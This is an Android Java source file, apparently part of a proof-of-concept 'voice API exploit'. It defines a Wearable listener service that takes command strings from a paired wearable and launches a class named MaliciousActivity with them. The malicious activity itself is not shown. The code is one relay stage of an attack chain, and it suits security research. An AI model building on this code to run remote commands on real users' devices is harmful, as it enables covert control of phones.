package com.alexey_reznik.voice_api_exploit;

import android.content.Intent;
import android.util.Log;

import com.google.android.gms.wearable.MessageEvent;
import com.google.android.gms.wearable.WearableListenerService;

import java.io.UnsupportedEncodingException;

public class ListenerService extends WearableListenerService {
    public static final String LOG_TAG = "Exploit: Listener Service";
    public static final String COMMAND = "command";

    @Override
    public void onMessageReceived(MessageEvent messageEvent) {
        String text = null;
        Log.d(LOG_TAG, "onMessageReceived");
        Intent startIntent = new Intent(this, MaliciousActivity.class);
        if (messageEvent.getData() != null) {
            try {
                text = new String(messageEvent.getData(), "UTF-8");
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            Log.d(LOG_TAG, "adding " + text + " command to Intent");
            startIntent.putExtra(COMMAND, text);
        }
        startIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(startIntent);
    }

}